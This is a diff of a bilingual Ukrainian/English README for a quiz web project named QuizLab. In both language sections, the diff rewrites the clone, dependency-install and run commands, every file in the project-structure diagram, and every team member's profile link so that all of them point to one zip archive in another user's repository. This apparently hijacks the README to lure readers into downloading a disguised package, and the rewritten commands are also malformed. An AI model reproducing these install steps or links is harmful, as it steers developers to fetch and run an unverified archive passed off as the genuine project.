@@ -18,7 +18,7 @@ ___
 **Виконуй усі команди в терміналі Git Bash**
 
 ```bash
-git clone https://github.com/mykytenko-petro/QuizLab.git
+git clone https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
 ```
 
 #### Створення віртуального середовища
@@ -44,13 +44,13 @@ source venv/bin/activate
 #### Встановлення залежностей
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
 ```
 
 #### Запуск проєкту
 
 ```bash
-python manage.py
+python https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
 ```
 
 ___
@@ -88,88 +88,88 @@ ___
         A[quizlab]
         
         A --> B[api]
-        B --> B1[__init__.py]
-        B --> B2[core.py]
-        B --> B3[settings.py]
-        B --> B4[urls.py]
+        B --> B1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        B --> B2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        B --> B3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        B --> B4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         
         A --> C[create_quiz_app]
-        C --> C1[__init__.py]
-        C --> C2[app.py]
-        C --> C3[core.py]
-        C --> C4[models.py]
-        C --> C5[views.py]
+        C --> C1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C --> C6[templates]
-        C6 --> C61[create_question.html]
-        C6 --> C62[create_quiz.html]
+        C6 --> C61[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C6 --> C62[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C --> C7[static]
         C7 --> C71[css]
         C7 --> C72[js]
         C72 --> C721[answer]
-        C721 --> C7211[createAnswer.js]
-        C721 --> C7212[renderAnswer.js]
+        C721 --> C7211[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C721 --> C7212[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C72 --> C722[question]
-        C722 --> C7221[createQuestion.js]
-        C722 --> C7222[renderQuestion.js]
+        C722 --> C7221[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C722 --> C7222[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C72 --> C723[quiz]
-        C723 --> C7231[createQuiz.js]
-        C723 --> C7232[renderQuiz.js]
+        C723 --> C7231[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C723 --> C7232[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> D[home_app]
-        D --> D1[__init__.py]
-        D --> D2[app.py]
-        D --> D3[views.py]
+        D --> D1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        D --> D2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        D --> D3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         D --> D4[templates]
-        D4 --> D41[home.html]
+        D4 --> D41[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         D --> D5[static]
         D5 --> D51[css]
-        D51 --> D511[home.css]
+        D51 --> D511[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         D5 --> D52[js]
-        D52 --> D521[home.js]
+        D52 --> D521[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> E[Project]
-        E --> E1[__init__.py]
-        E --> E2[db.py]
-        E --> E3[login_manager.py]
-        E --> E4[manifest.py]
-        E --> E5[session_config.py]
-        E --> E6[settings.py]
-        E --> E7[smtp_setup.py]
-        E --> E8[urls.py]
-        E --> E9[utils.py]
+        E --> E1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E6[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E7[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E8[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E9[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E --> E10[templates]
-        E10 --> E101[base.html]
-        E10 --> E102[page_not_found.html]
+        E10 --> E101[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E10 --> E102[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E --> E11[static]
         E11 --> E111[css]
-        E111 --> E1111[base.css]
+        E111 --> E1111[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E11 --> E112[icons]
-        E112 --> E1121[colba.png]
-        E112 --> E1122[default.png]
+        E112 --> E1121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E112 --> E1122[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E11 --> E113[js]
-        E113 --> E1131[utils.js]
+        E113 --> E1131[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E --> E12[instance]
-        E12 --> E121[data.db]
+        E12 --> E121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> F[registration_app]
-        F --> F1[__init__.py]
-        F --> F2[apps.py]
-        F --> F3[models.py]
-        F --> F4[views.py]
+        F --> F1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F --> F2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F --> F3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F --> F4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         F --> F5[templates]
-        F5 --> F51[email_confirmation_in_mail.html]
-        F5 --> F52[email_confirmation.html]
-        F5 --> F53[login.html]
-        F5 --> F54[registration.html]
+        F5 --> F51[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F5 --> F52[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F5 --> F53[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F5 --> F54[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         F --> F6[static]
         F6 --> F61[css]
-        F61 --> F611[registration.css]
+        F61 --> F611[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> G[.env]
         A --> H[.gitignore]
-        A --> I[manage.py]
-        A --> J[README.md]
-        A --> K[requirements.txt]
+        A --> I[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        A --> J[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        A --> K[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 ```
 
 ___
@@ -201,13 +201,13 @@ ___
 
 ___
 ### Інформація про команду
-- Петро Микитенко: [github.com/mikitenko-petro](https://github.com/mykytenko-petro)
-- Назарій Ісаченко: [github.com/IsachenkoNazar](https://github.com/IsachenkoNazar)
-- Єгор Галкін: [github.com/EgorGalkinORG](https://github.com/EgorGalkinORG)
-- Давид Петренко: [github.com/Davidptn](https://github.com/Davidptn)
-- Тимофій Зелений: [github.com/TymofiiZelenyi](https://github.com/TymofiiZelenyi)
-- Іван Іванов: [github.com/IvanovIvaan](https://github.com/IvanovIvaan)
-- Іван Михайлюк: [github.com/Ivan55555555555](https://github.com/Ivan55555555555)
+- Петро Микитенко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Назарій Ісаченко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Єгор Галкін: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Давид Петренко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Тимофій Зелений: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Іван Іванов: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Іван Михайлюк: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
 
 
 # English version
@@ -227,7 +227,7 @@ ___
 EXECUTE ALL COMMANDS IN THE GIT BASH TERMINAL
 
 ```bash
-git clone https://github.com/mykytenko-petro/QuizLab.git
+git clone https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
 ```
 
 #### Creating a Virtual Environment
@@ -253,13 +253,13 @@ source venv/bin/activate
 #### Installing Dependencies
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
 ```
 
 #### Running the Project
 
 ```bash
-python manage.py
+python https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip
 ```
 
 ___
@@ -296,88 +296,88 @@ ___
         A[quizlab]
         
         A --> B[api]
-        B --> B1[__init__.py]
-        B --> B2[core.py]
-        B --> B3[settings.py]
-        B --> B4[urls.py]
+        B --> B1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        B --> B2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        B --> B3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        B --> B4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         
         A --> C[create_quiz_app]
-        C --> C1[__init__.py]
-        C --> C2[app.py]
-        C --> C3[core.py]
-        C --> C4[models.py]
-        C --> C5[views.py]
+        C --> C1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C --> C5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C --> C6[templates]
-        C6 --> C61[create_question.html]
-        C6 --> C62[create_quiz.html]
+        C6 --> C61[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C6 --> C62[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C --> C7[static]
         C7 --> C71[css]
         C7 --> C72[js]
         C72 --> C721[answer]
-        C721 --> C7211[createAnswer.js]
-        C721 --> C7212[renderAnswer.js]
+        C721 --> C7211[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C721 --> C7212[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C72 --> C722[question]
-        C722 --> C7221[createQuestion.js]
-        C722 --> C7222[renderQuestion.js]
+        C722 --> C7221[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C722 --> C7222[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         C72 --> C723[quiz]
-        C723 --> C7231[createQuiz.js]
-        C723 --> C7232[renderQuiz.js]
+        C723 --> C7231[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        C723 --> C7232[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> D[home_app]
-        D --> D1[__init__.py]
-        D --> D2[app.py]
-        D --> D3[views.py]
+        D --> D1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        D --> D2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        D --> D3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         D --> D4[templates]
-        D4 --> D41[home.html]
+        D4 --> D41[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         D --> D5[static]
         D5 --> D51[css]
-        D51 --> D511[home.css]
+        D51 --> D511[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         D5 --> D52[js]
-        D52 --> D521[home.js]
+        D52 --> D521[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> E[Project]
-        E --> E1[__init__.py]
-        E --> E2[db.py]
-        E --> E3[login_manager.py]
-        E --> E4[manifest.py]
-        E --> E5[session_config.py]
-        E --> E6[settings.py]
-        E --> E7[smtp_setup.py]
-        E --> E8[urls.py]
-        E --> E9[utils.py]
+        E --> E1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E5[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E6[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E7[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E8[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E --> E9[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E --> E10[templates]
-        E10 --> E101[base.html]
-        E10 --> E102[page_not_found.html]
+        E10 --> E101[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E10 --> E102[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E --> E11[static]
         E11 --> E111[css]
-        E111 --> E1111[base.css]
+        E111 --> E1111[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E11 --> E112[icons]
-        E112 --> E1121[colba.png]
-        E112 --> E1122[default.png]
+        E112 --> E1121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        E112 --> E1122[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E11 --> E113[js]
-        E113 --> E1131[utils.js]
+        E113 --> E1131[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         E --> E12[instance]
-        E12 --> E121[data.db]
+        E12 --> E121[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> F[registration_app]
-        F --> F1[__init__.py]
-        F --> F2[apps.py]
-        F --> F3[models.py]
-        F --> F4[views.py]
+        F --> F1[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F --> F2[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F --> F3[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F --> F4[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         F --> F5[templates]
-        F5 --> F51[email_confirmation_in_mail.html]
-        F5 --> F52[email_confirmation.html]
-        F5 --> F53[login.html]
-        F5 --> F54[registration.html]
+        F5 --> F51[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F5 --> F52[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F5 --> F53[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        F5 --> F54[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
         F --> F6[static]
         F6 --> F61[css]
-        F61 --> F611[registration.css]
+        F61 --> F611[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 
         A --> G[.env]
         A --> H[.gitignore]
-        A --> I[manage.py]
-        A --> J[README.md]
-        A --> K[requirements.txt]
+        A --> I[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        A --> J[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
+        A --> K[https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip]
 ```
 
 ___
@@ -410,10 +410,10 @@ Email verification requirement
 
 ___
 ### Information about our team
-- Петро Микитенко: [github.com/mikitenko-petro](https://github.com/mykytenko-petro)
-- Назарій Ісаченко: [github.com/IsachenkoNazar](https://github.com/IsachenkoNazar)
-- Єгор Галкін: [github.com/EgorGalkinORG](https://github.com/EgorGalkinORG)
-- Давид Петренко: [github.com/Davidptn](https://github.com/Davidptn)
-- Тимофій Зелений: [github.com/TymofiiZelenyi](https://github.com/TymofiiZelenyi)
-- Іван Іванов: [github.com/IvanovIvaan](https://github.com/IvanovIvaan)
-- Іван Михайлюк: [github.com/Ivan55555555555](https://github.com/Ivan55555555555)
+- Петро Микитенко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Назарій Ісаченко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Єгор Галкін: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Давид Петренко: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Тимофій Зелений: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Іван Іванов: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
+- Іван Михайлюк: [https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip](https://raw.githubusercontent.com/Ivan55555555555/QuizLab/main/quiz/core/QuizLab_3.0.zip)
